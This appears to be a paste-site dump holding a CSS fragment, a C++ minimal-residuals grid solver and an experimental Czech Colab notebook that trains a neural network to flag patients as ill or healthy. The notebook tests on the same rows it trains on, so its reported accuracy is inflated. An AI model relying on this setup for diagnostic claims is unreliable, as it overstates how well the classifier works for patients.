	body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider {
		aspect-ratio: 145 * 2 / 159.79;
	}
}

/* Mobile */

body.single-listing.seraph-accel-view-mobile:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .listing-app-view .app-view-gallery:not(:has(.slick-track)) .slide-img:nth-of-type(1n + 2) {
	display: none;
	width: 100% !important;
}

body.single-listing.seraph-accel-view-mobile:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .listing-app-view .app-view-gallery .slick-track .slide-img {
	transition: none !important;
}

body.single-listing.seraph-accel-view-mobile:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .listing-app-view .app-view-gallery:not(:has(.slick-track)) .slide-img img {
	width: 100% !important;
}
"
Du6QkexF,mmn_main_func,vatman,C++,Sunday 26th of May 2024 01:49:16 PM CDT,"#include <cmath>
#include <iomanip>
#include <iostream>
#include <vector>

double f(double x, double y) { return -std::pow(std::sin(M_PI * y * x), 2); }

/* double u(double x, double y) { */
/*   return std::exp(std::pow(std::sin(M_PI * x * y), 2)); */
/* } */

std::vector<std::vector<double>> MinimalResiduals(const int nmax = 1000,
                                                  const double _eps = 0.0000001,
                                                  const int _n = 3,
                                                  const int _m = 3) {
  int Nmax = nmax; // –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ —á–∏—Å–ª–æ –∏—Ç–µ—Ä–∞—Ü–∏–π (–Ω–µ –º–µ–Ω–µ–µ 1)
  std::vector<std::vector<double>> v; // —Å–µ—Ç–æ—á–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —µ (x, y)
  v.resize(_n + 1);
  for (size_t i = 0; i < _n + 1; i++) {
    v[i].resize(_m + 1);
    for (size_t j = 0; j < _m + 1; j++) {
      v[i][j] = 0;
    }
  }
  std::vector<std::vector<double>> r_vec; // –≤–µ–∫—Ç–æ—Ä –Ω–µ–≤—è–∑–∫–∏
  r_vec.resize(_n + 1);
  for (size_t i = 0; i < _n + 1; i++) {
    r_vec[i].resize(_m + 1);
    for (size_t j = 0; j < _m + 1; j++) {
      r_vec[i][j] = 0;
    }
  }
  std::vector<std::vector<double>> ar;
  ar.resize(_n + 1);
  for (size_t i = 0; i < _n + 1; i++) {
    ar[i].resize(_m + 1);
    for (size_t j = 0; j < _m + 1; j++) {
      ar[i][j] = 0;
    }
  }
  double r1 = 0;
  int S = 0;         // —Å—á–µ—Ç—á–∏–∫ –∏—Ç–µ—Ä–∞—Ü–∏–π
  double eps = _eps; // –∑–∞–¥–∞–Ω–Ω–∞—è —Ç–æ—á–Ω–æ—Å—Ç—å
  double eps_max = 0; // —Ç–æ—á–Ω–æ—Å—Ç—å, –¥–æ—Å—Ç–∏–≥–Ω—É—Ç–∞—è –Ω–∞ —Ç–µ–∫—É—â–µ–π –∏—Ç–µ—Ä–∞—Ü–∏–∏
  double eps_cur = 0; // –¥–ª—è –ø–æ–¥—Å—á–µ—Ç–∞ —Ç–æ—á–Ω–æ—Å—Ç–∏ –Ω–∞ —Ç–µ–∫—É—â–µ–π –∏—Ç–µ—Ä–∞—Ü–∏–∏
  double a2, k2, h2; // –Ω–µ–Ω—É–ª–µ–≤—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –º–∞—Ç—Ä–∏—Ü—ã (-–ê)
  const int n = _n, m = _m; // —Ä–∞–∑–º–µ—Ä–Ω–æ—Å—Ç—å —Å–µ—Ç–∫–∏
  double r_max = 0;
  double a = 0;
  double b = 1;
  double c = 0;
  double d = 1; // –≥—Ä–∞–Ω–∏—Ü—ã –æ–±–ª–∞—Å—Ç–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —É—Ä–∞–≤–Ω–µ–Ω–∏—è
  int i, j; // –∏–Ω–¥–µ–∫—Å—ã
  double r = 0;
  double v_old; // —Å—Ç–∞—Ä–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ–º–æ–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –≤–µ–∫—Ç–æ—Ä–∞
  double v_new; // –Ω–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ–º–æ–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –≤–µ–∫—Ç–æ—Ä–∞ –∏
  bool flag = false; // —É—Å–ª–æ–≤–∏–µ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏
  double h = ((b - a) / n);
  double k = ((d - c) / m);
  double z = 0;
  double z_max = 0;
  double tau_s = 0;
  double num = 0; // tau=num/denominator
  double denominator = 1;
  h2 = -std::pow((n / (b - a)), 2);
  k2 = -std::pow((m / (d - c)), 2);
  a2 = -2 * (h2 + k2);
  for (int i = 0; i < n + 1; i++) {
    double x = a + i * h;
    v[i][0] = x - x * x;
    v[i][m] = x - x * x;
  }
  for (int j = 0; j < m + 1; j++) {
    double y = c + j * k;
    v[0][j] = std::sin(M_PI * y);
    v[n][j] = std::sin(M_PI * y);
  }
  do {
    z = 0;
    /* std::cout << ""–≤–µ–∫—Ç–æ—Ä –Ω–µ–≤—è–∑–∫–∏:"" << std::endl; */
    /* for (int i = n - 1; i >= 0; i--) { */
    /*   for (int j = 0; j < m; j++) */
    /*     std::cout << std::left << std::setw(10) << r_vec[i][j]; */
    /*   std::cout << ""\n""; */
    /* } */
    /* std::cout << ""–ø—Ä–æ–º–µ–∂—É—Ç–æ—á–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ:"" << std::endl; */
    /* for (int i = n - 1; i >= 0; i--) { */
    /*   for (int j = 0; j < m; j++) */
    /*     std::cout << std::left << std::setw(10) << v[i][j]; */
    /*   std::cout << ""\n""; */
    /* } */
    z_max = 0;
    eps_max = 0;
    r_max = -20;
    num = 0;
    denominator = 0;
    for (j = 1; j < m; j++) {
      for (i = n - 1; i > 0; i--) {
        r_vec[i][j] = f(a + i * h, c + j * k) -
                      (h2 * (v[i + 1][j] + v[i - 1][j]) +
                       k2 * (v[i][j + 1] + v[i][j - 1]) + v[i][j] * a2);
      }
    }
    for (j = 1; j < m; j++) {
      for (i = n - 1; i > 0; i--) {
        ar[i][j] =
            (h2 * (r_vec[i + 1][j] + r_vec[i - 1][j]) +
             k2 * (r_vec[i][j + 1] + r_vec[i][j - 1]) + r_vec[i][j] * a2);
        num += ar[i][j] * r_vec[i][j];
        denominator += ar[i][j] * ar[i][j];
      }
    }
    tau_s = num / denominator;
    for (j = 1; j < m; j++) {
      for (i = n - 1; i > 0; i--) {
        v_old = v[i][j];
        v_new = v_old + tau_s * r_vec[i][j];
        eps_cur = std::fabs(v_old - v_new);
        if (eps_cur > eps_max) {
          eps_max = eps_cur;
        }
        v[i][j] = v_new;
        r = fabs(f(a + i * h, c + j * k) -
                 (h2 * (v[i + 1][j] + v[i - 1][j]) +
                  k2 * (v[i][j + 1] + v[i][j - 1]) + v_old * a2));
        if (r > r_max)
          r_max = r;
        /* z = u(a + i * h, c + j * k) - v[i][j]; */
        /* if (z > z_max) */
        /*   z_max = z; */
      }
    }

    S = S + 1;
    if ((eps_max <= eps) or (S >= Nmax)) {
      flag = true;
    }
  } while (!flag);

  std::cout << ""\n–°–ü–†–ê–í–ö–ê:"" << std::endl;

  std::cout << ""–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã—Ö –∏—Ç–µ—Ä–∞—Ü–∏–π = "" << S << std::endl;
  std::cout << ""–¢–æ—á–Ω–æ—Å—Ç—å –Ω–∞ –≤—ã—Ö–æ–¥–µ = "" << eps_max << std::endl;
  std::cout << ""–ù–µ–≤—è–∑–∫–∞ = "" << r_max << std::endl;
  std::cout << ""–ù–æ—Ä–º–∞ –æ–±—â–µ–π –ø–æ–≥—Ä–µ—à–Ω–æ—Å—Ç–∏ = "" << z_max << std::endl;
  return v;
}

int main() {
  int n = 10;
  int m = 10;
  std::vector<std::vector<double>> v(n, std::vector<double>(m, 0));
  v = MinimalResiduals(100000, 0.000001, n, m);
  n++;
  m++;
  /* std::cout << ""–†–µ–∑—É–ª—å—Ç–∞—Ç:"" << std::endl; */
  /* for (int j = 0; j < m; j++) { */
  /*   for (int i = n - 1; i >= 0; i--) { */
  /*     std::cout << std::left << std::setw(10) << v[i][j]; */
  /*   } */
  /*   std::cout << ""\n""; */
  /* } */
  std::cout << ""–†–µ–∑—É–ª—å—Ç–∞—Ç:"" << std::endl;
  for (int i = n - 1; i >= 0; i--) {
    for (int j = 0; j < m; j++)
      std::cout << std::left << std::setw(10) << v[i][j];
    std::cout << ""\n"";
  }
  return 0;
}
"
DjmKS5BC,the best so far: BLACK OK very GOOD VK with shuffle,max2201111,Python,Sunday 26th of May 2024 01:40:42 PM CDT,"#Navod na pouziti, Mgr. Hynek Mlƒçou≈°ek, v Brne 2.5.2024
#Ulozte do lokalniho souboru u sebe na PC data tohoto tvaru vzdy ukoncene 0 ci 1 (jde o uceni s ucitelem: 1 = nemocny, 0 = prezil/zdravy, ve vystupu bude zelena znacit 0, cervena 1)  a bez znaku #; pozor na "",""

# [ [23.657800719276743,18.859916797201468,0],
# [22.573729142097473,17.96922325097786,0],
# [32.55342396968757,29.463651408558803,0],
# [6.718035041529263,25.704665468161718,1],
# [14.401918566243225,16.770856492924658,0],
# [17.457907312962234,21.76521470574044,0],
# [20.02796946568093,73.45445954770891,1],
# [30.295138369778076,62.901112886193246,1],
# [15.128977804449633,32.40267702110393,0],
# [30.179457395820013,58.982492125646104,1],
# [28.01649701854089,63.92781357637711,1],
# [16.791838457871147,42.33482314089884,0],
# [10.583694293380976,19.61926728942497,0],
# [26.634447074406467,91.96624817360987,1],
# [26.217868623367643,36.400293587062976,0],
# [17.689396788624936,60.79797114006423,1],
# [33.17193822527976,66.75277364959176,1],
# [23.793952755709153,22.57501437360518,0]]

#kliknete na cerne tlacitko s trojuhelnickem vlevo nahore
#pod kodem se objevi moznost spustit dialogove okenko, kliknete na nej
#soubor, ktery mate z bodu vyse vyberte a nahrajte
#Najdete v tomto kodu retezec:
###ZDE VLOZTE DATA OD NOVYCH PACIENTU

#Vlozte do pole
# new_persons_results = []
# data o nekolika malo novych pacientech bez ukoncovaci 0 a 1, ale se stejnym poctem sloupcu jako ma soubor z Vaseho lokalniho disku, vyse by tedy toto bylo rovno 2
#kod vyhodi hned po natrenovani, (jehoz prubeh muzete sledovat na modre progres bare) pro kazdy radek z new_persons_results bilo-sedo-cerne ctverecky vznikle z normalizace poskytnutych dat a ukoncovaci ctverecek cerveny pripadne zeleny
#zaroven s tim se vypise realne cislo mezi 0 a 1 znacici jak moc je pacient zdravy (blizke 0) ci nemocny (blizke 1)
#cisla uprostred pak indikuji zadany oranzovy semafor.
#je na lekarich nastavit tresholdy (tedy pravdepodobnosti: cisla mezi 0 a 1) ktere pak daji zaver, zda je pacient cerveny, oranzovy ci zeleny

# prosim o komnetare a vysledky na realnych datech, je zadouci aby radku v matici, tedy pacientu byly stovky a sloupcu desitky
# Moznosti vyuziti: onkologicka diagnoza vs. zdrava kontorlni skupina, diabetes (pritomnost/nepritomnost), testovani noveho leku oproti placebu atd.

#kod zaroven vyhodi confusion matici, tedy mozne True Negative a False Positive plus spravne zarazene hodnoty spolu s presnosti,F1 score recall atd.
#poznamka ke kodu: jde o epxerimentalni verzi, ktera krome skutecne potrebneho kodu obsahuje ladici informace, ruzne duplicity, nadbytecne prikazy atd.
# Na uvod behu programu se pro kontorlu vypise poskytnuta matice a jeji normalizovana verze, je treba sjet jezdcem napravo nize na obrazky a dalsi vystupy

#Dekuji profesoru Petru Dostalovi za namet k teto praci a poskytnuta data, byt je potreba mit data realna

import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm import tqdm


from IPython.display import display
from IPython.display import Javascript
display(Javascript('IPython.OutputArea.auto_scroll_threshold = 9999;'))

label_colors = {0: [0, 128, 0], 1: [255, 0, 0]}
label_colors_testing = {0: [0, 128, 0], 1: [255, 0, 0]}


%matplotlib inline



# Function to create images based on predictions
def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Create a gradient based on the normalized values
        gradient_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
        image[i, -1] = np.array([gradient_value] * 3)

    return image

def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use red for class 0 and green for class 1
        if predictions[i] == 0:
            image[i, -1] = np.array([255, 0, 0])  # Red
        elif predictions[i] == 1:
            image[i, -1] = np.array([0, 128, 0])  # Green

    return image

def create_image(data, predictions, label_colors):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [np.min(data), np.max(data)], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data[:, j]), np.max(data[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image


def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    data_array = np.array(data)  # Convert data to a NumPy array

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    data_array = np.array(data)  # Convert data to a NumPy array

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    # Now, normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(image[:, -1])
    max_pixel_value = np.max(image[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(image[i, -1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Now, normalize the last column separately to achieve grayscale


        min_pixel_value = np.min(data[:, -1])
        max_pixel_value = np.max(data[:, -1])
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        min_pixel_value = np.min(data[i])
        max_pixel_value = np.max(data[i])
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image


def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(data[:, -1])
    max_pixel_value = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    # Convert data to a NumPy array
    data = np.array(data)

    num_rows, num_columns = data.shape
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(data[:, -1])
    max_pixel_value = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image


def create_imageN(data, predictions, label_colors=None):
    # Convert data to a NumPy array
    data = np.array(data)

    num_rows, num_columns = data.shape
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value_last = np.min(data[:, -1])
    max_pixel_value_last = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value_last, max_pixel_value_last], [0, 255]))
        image[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


    print(""**************************"",num_training_rows,""*******************"")

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    # for i, label in enumerate(y_train):
    #     for j in range(len(X_train[0])
    #         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
    #         image_training[i, j] = np.array([pixel_value] * 3)
    #         image_training[i, -1] = np.array([128, 128, 128])
    #     if label == 0:
    #         image_training[i, -1] = np.array([0, 128, 0])
    #     elif label == 1:
    #         image_training[i, -1] = np.array([255, 0, 0])



    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    for i, label in enumerate(y_train):
        for j in range(len(X_train[0])):
            pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)
        image_training[i, -1] = np.array([128, 128, 128])
        if label == 0:
            image_training[i, -1] = np.array([0, 128, 0])
        elif label == 1:
            image_training[i, -1] = np.array([255, 0, 0])


    return image_training








def create_imageN(data, predictions, label_colors=None):
    num_training_rows = 1  # Set the number of rows to 1
    image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(data[0][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[0, j] = np.array([pixel_value] * 3)

    image_training[0, -1] = np.array([128, 128, 128])  # Set a consistent gray background

    label = y_train[0]
    if label == 0:
        image_training[0, -1] = np.array([0, 128, 0])  # Green for label 0
    elif label == 1:
        image_training[0, -1] = np.array([255, 0, 0])  # Red for label 1

    return image_training

def create_imageN(data, predictions, label_colors=None):
    num_training_rows = len(data)  # Set the number of rows based on the data
    num_columns = len(data[0])

    image_training = np.zeros((num_training_rows, num_columns + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    for i in range(num_training_rows):
        # Normalize the first columns independently
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image_training[i, -1] = label_colors[predictions[i]]

    return image_training




# Load data from a file
#file_path = 'C:/Users/Hynek/Desktop/example4.txt'
from google.colab import files
uploaded = files.upload()

# Tento k√≥d otev≈ôe dialogov√© okno pro v√Ωbƒõr souboru z va≈°eho poƒç√≠taƒçe.
import io
import pandas as pd

# P≈ôedpokl√°d√°me, ≈æe jste nahr√°li CSV soubor
for fn in uploaded.keys():
  print('User uploaded file ""{name}"" with length {length} bytes'.format(
      name=fn, length=len(uploaded[fn])))
  path = io.BytesIO(uploaded[fn])  # Pro soubory, kter√© pot≈ôebuj√≠ b√Ωt ƒçteny jako bin√°rn√≠ objekty
  df = pd.read_csv(path)
  print(df.head())  # Vyp√≠≈°e prvn√≠ch pƒõt ≈ô√°dk≈Ø DataFrame


all_results = []
#with open(file_path, 'r') as file:
#    file_content = file.read()

# Execute the content as Python code
##exec(file_content)

import os
import shutil
import ast

for filename in uploaded.keys():
    original_path = f""/content/{filename}""
    destination_path = os.path.join(""/content/"", ""/content/DATA2"")
    shutil.move(original_path, destination_path)
    print(f""Soubor {filename} byl p≈ôesunut do {destination_path}"")

file_path = '/content/DATA2'  # Cesta k souboru
with open(file_path, 'r') as file:
    code = file.read()

A_list = ast.literal_eval(code)


# P≈ôevod na NumPy pole
A = np.array(A_list)

#exec(code)

# Now, all_results contains lists corresponding to each row in the CSV file
##print(all_results)

# Assign values to variables dynamically based on the rows of matrix A
for i, row in enumerate(A, start=1):
    globals()[f""person{i}_results""] = list(row)

# Print the assigned variables
for i in range(1, len(A) + 1):
  #  print(f""person{i}_results {globals()[f'person{i}_results']}"")
    all_results.append(f""person{i}_results"")
##print(all_results)



result_variables = []

# Loop through the variable names and get the corresponding variables using globals()
for var_name in all_results:
    result_variables.append(globals()[var_name])

# Now, result_variables contains the variables with names specified in variable_names
#print(result_variables)

all_results = result_variables
new_persons_results = result_variables


# # Define the blood test results for sixteen persons
# person1_results = [80, 90, 100, 125, 120, 0]
# person2_results = [95, 105, 115, 110, 135, 1]
# person3_results = [110, 120, 130, 140, 150, 0]
# person4_results = [100, 110, 120, 130, 140, 1]
# person5_results = [105, 115, 100, 105, 110, 0]
# person6_results = [90, 110, 115, 95, 120, 1]
# person7_results = [116, 99, 106, 105, 119, 0]
# person8_results = [111, 93, 118, 118, 107, 1]
# person9_results = [107, 97, 105, 119, 98, 0]
# person10_results = [92, 108, 90, 117, 111, 1]
# person11_results = [118, 105, 103, 118, 99, 0]
# person12_results = [97, 115, 101, 101, 113, 1]
# person13_results = [95, 111, 93, 112, 120, 0]
# person14_results = [100, 112, 118, 109, 103, 1]
# person15_results = [113, 91, 94, 93, 99, 0]
# person16_results = [103, 92, 95, 110, 98, 1]

# # Combine the results into a list
# all_results = [person1_results, person2_results, person3_results, person4_results,
#                person5_results, person6_results, person7_results, person8_results,
#                person9_results, person10_results, person11_results, person12_results,
#                person13_results, person14_results, person15_results, person16_results]


# #all_results = [person1_results, person2_results]


# Extract the last column (0 or 1) as labels
labels = [results[-1] for results in all_results]

# Remove the last column from the dataset
data = [results[:-1] for results in all_results]

# Define the number of rows for training and testing
num_training_rows = 100
num_testing_rows = 100

# Split the data into training and testing datasets
#X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)

# Normalize the testing data using the min and max values of the training data
X_test_normalized = (X_test - min_values) / (max_values - min_values)


# Print normalized training data
print(""Normalized Training Data:"")
print(X_train_normalized)
print(""Adenormalized"",X_train_normalized*(max_values - min_values)+min_values,""Bdenormalized"")

# Define a simple neural network model
model = tf.keras.Sequential([
    tf.keras.layers.Dense(128, activation='relu', input_shape=(len(X_train[0]),)),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Lists to store accuracy values
accuracy_history = []

# Create images for the training data
image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


min_pixel_value = np.min(X_train_normalized)
max_pixel_value = np.max(X_train_normalized)

# Populate image_training with consistent gray and red/green colors based on the labels in the last column
# for i, label in enumerate(y_train):
#     for j in range(len(X_train[0])
#         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#         image_training[i, j] = np.array([pixel_value] * 3)
#         image_training[i, -1] = np.array([128, 128, 128])
#     if label == 0:
#         image_training[i, -1] = np.array([0, 128, 0])
#     elif label == 1:
#         image_training[i, -1] = np.array([255, 0, 0])



# Populate image_training with consistent gray and red/green colors based on the labels in the last column
for i, label in enumerate(y_train):
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, j] = np.array([pixel_value] * 3)
    image_training[i, -1] = np.array([128, 128, 128])
    if label == 0:
        image_training[i, -1] = np.array([0, 128, 0])
    elif label == 1:
        image_training[i, -1] = np.array([255, 0, 0])






from tqdm.notebook import tqdm_notebook


###ZDE VLOZTE DATA OD NOVYCH PACIENTU


# Train the model for 400 epochs
epochs = 138
